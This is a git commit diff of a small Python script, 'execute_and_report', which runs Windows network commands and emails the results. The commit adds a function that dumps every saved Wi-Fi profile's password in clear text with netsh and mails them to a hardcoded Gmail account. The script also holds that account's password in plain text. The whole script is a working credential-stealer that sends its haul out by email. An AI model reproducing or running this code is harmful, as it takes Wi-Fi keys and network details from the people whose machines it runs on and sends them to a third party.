fcfc31eb2db48afc2fde6ced95b982c15da2a619
Alexey <denier1025@gmail.com>
2018-09-02 00:08:05 +0300

    some changes

--- execute_and_report/execute_and_report.py
+++ execute_and_report/execute_and_report.py
@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 
-import subprocess
-import smtplib
+import subprocess, smtplib, re
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -10,8 +9,20 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
-command1 = "ipconfig /all"
-command2 = "arp -a"
-result1 = subprocess.check_output(command1, shell=True)
-result2 = subprocess.check_output(command2, shell=True)
-send_mail("boggrom@gmail.com", "h3z9y85$", "IPCONFIG /ALL\\r\\n" + result1 + "ARP -A\\r\\n" + result2)
+def ipconfig_arp_commands():
+    command1 = "ipconfig /all"
+    command2 = "arp -a"
+    result1 = subprocess.check_output(command1, shell=True)
+    result2 = subprocess.check_output(command2, shell=True)
+    send_mail("boggrom@gmail.com", "h3z9y85$", "IPCONFIG /ALL\\r\\n" + result1 + "ARP -A\\r\\n" + result2)
+
+def netsh_command():
+    command = "netsh wlan show profile"
+    networks = subprocess.check_output(command, shell=True)
+    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+    result = ""
+    for network_name in network_names_list:
+        current_command = "netsh wlan show profile " + network_name + " key=clear"
+        current_result = subprocess.check_output(current_command, shell=True)
+        result += current_result
+    send_mail("boggrom@gmail.com", "h3z9y85$", result)
